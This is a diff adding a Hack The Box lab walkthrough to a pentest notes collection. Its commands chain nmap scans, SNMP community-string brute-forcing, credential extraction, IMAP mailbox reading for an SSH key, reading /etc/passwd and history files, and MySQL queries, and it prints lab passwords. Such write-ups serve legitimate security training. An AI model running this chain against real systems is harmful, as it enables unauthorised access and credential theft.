@@ -757,6 +757,123 @@ stty raw -echo; fg
 
 <span class="comment"># Step 4: Set terminal type</span>
 export TERM=xterm</div>`
+  },
+  {
+    id: 25,
+    title: "HTB Footprinting Lab (Hard) – Full Walkthrough",
+    category: "Labs & Walkthroughs",
+    tags: ["footprinting", "snmp", "imap", "ssh", "mysql", "htb", "enumeration", "post-exploitation"],
+    commands: [
+      "nmap -sV -sC -A $RHOST",
+      "sudo nmap -sU --top-ports 100 -sV $RHOST",
+      "snmpwalk -v2c -c backup $RHOST",
+      "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $RHOST",
+      "openssl s_client -connect ${RHOST}:143 -starttls imap",
+      "ssh -i id_rsa tom@$RHOST",
+      "mysql -u tom -p"
+    ],
+    description: "Full walkthrough of the HTB Footprinting Hard lab. Attack chain: Nmap TCP+UDP scan reveals SNMP on port 161. SNMP community string brute-force finds 'backup' community with credentials. IMAP access yields SSH private key. Post-exploitation finds MySQL with final HTB credentials.",
+    body: `<h3>Target</h3>
+<div class="cmd-block">export RHOST=10.129.26.52</div>
+
+<h3>1. Initial Enumeration – TCP Scan</h3>
+<div class="cmd-block">nmap -sV -sC -A $RHOST
+<span class="comment"># 22 → SSH | 110 → POP3 | 143 → IMAP | 993 → IMAPS | 995 → POP3S</span></div>
+<p>Mail server detected → likely credential-based attack.</p>
+
+<h3>2. UDP Scan (CRITICAL STEP)</h3>
+<div class="cmd-block">sudo nmap -sU --top-ports 100 -sV $RHOST
+<span class="comment"># 161 → SNMP (hidden attack surface)</span></div>
+
+<h3>3. SNMP Enumeration</h3>
+<div class="cmd-block"><span class="comment"># Test default community</span>
+snmpwalk -v2c -c public $RHOST
+
+<span class="comment"># Brute-force community strings</span>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $RHOST
+<span class="comment"># Result: backup</span>
+
+<span class="comment"># Dump SNMP data with discovered community</span>
+snmpwalk -v2c -c backup $RHOST | tee snmpwalk.txt
+
+<span class="comment"># Extract credentials</span>
+grep -Ei 'user|pass|mail|login|credential' snmpwalk.txt
+<span class="comment"># Found → username: tom | password: NMds732Js2761</span></div>
+
+<h3>4. IMAP Access</h3>
+<div class="cmd-block"><span class="comment"># Connect to IMAP</span>
+openssl s_client -connect \${RHOST}:143 -starttls imap
+
+<span class="comment"># Login &amp; enumerate mailbox</span>
+A001 LOGIN tom NMds732Js2761
+A002 LIST "" "*"
+A003 SELECT INBOX
+A004 SEARCH ALL
+A005 FETCH 1 BODY[]
+A006 FETCH 2 BODY[]
+A007 FETCH 3 BODY[]
+<span class="comment"># Found: SSH private key</span></div>
+
+<h3>5. SSH Access</h3>
+<div class="cmd-block"><span class="comment"># Save key and set permissions</span>
+nano id_rsa
+chmod 600 id_rsa
+
+<span class="comment"># SSH into box</span>
+ssh -i id_rsa tom@$RHOST</div>
+
+<h3>6. Post-Exploitation Enumeration</h3>
+<div class="cmd-block"><span class="comment"># Check identity and users</span>
+id; whoami; hostname
+cat /etc/passwd
+
+<span class="comment"># Check running DB services</span>
+ps aux | grep -Ei 'mysql|maria|postgres|sql'
+<span class="comment"># Found: MySQL running</span>
+
+<span class="comment"># Check listening ports</span>
+ss -lntp
+<span class="comment"># 127.0.0.1:3306 → MySQL (local only, must access from inside)</span>
+
+<span class="comment"># Search for DB/config/mail files</span>
+find / -maxdepth 3 -type f 2>/dev/null | grep -Ei 'db|sql|sqlite|config|mail|backup'</div>
+
+<h3>7. Key Discovery – MySQL History</h3>
+<div class="cmd-block">cat ~/.mysql_history
+<span class="comment"># Found: show databases; use users; select * from users;</span>
+<span class="comment"># DB name = users</span></div>
+
+<h3>8. MySQL Access &amp; Database Enumeration</h3>
+<div class="cmd-block"><span class="comment"># Login with reused credentials</span>
+mysql -u tom -p
+<span class="comment"># Password: NMds732Js2761</span>
+
+SHOW DATABASES;
+<span class="comment"># Found: users</span>
+
+USE users;
+
+SELECT * FROM users WHERE username LIKE 'HTB';
+<span class="comment"># username: HTB | password: cr3n4o7rzse7rzhnckhssncif7ds</span></div>
+
+<h3>Attack Chain Summary</h3>
+<p><strong>Nmap → UDP scan → SNMP → creds → IMAP → SSH key → SSH → MySQL → HTB creds</strong></p>
+
+<h3>Lessons Learned</h3>
+<ul>
+<li><strong>Always scan UDP</strong> – TCP looked clean, real entry point was SNMP on UDP 161</li>
+<li><strong>Services are connected</strong> – SNMP → credentials, IMAP → key, SSH → shell, MySQL → final creds</li>
+<li><strong>Check history files</strong> – <code>~/.mysql_history</code> and <code>~/.bash_history</code> reveal past commands and DB names</li>
+<li><strong>Local services = gold</strong> – MySQL was not exposed externally, required shell access first</li>
+<li><strong>Credential reuse</strong> – Same password worked for IMAP and MySQL</li>
+</ul>
+
+<h3>Personal Takeaways</h3>
+<ul>
+<li>If stuck → check UDP</li>
+<li>If creds found → reuse everywhere</li>
+<li>If shell gained → check history files, configs, local services</li>
+</ul>`
   }
 ];
 
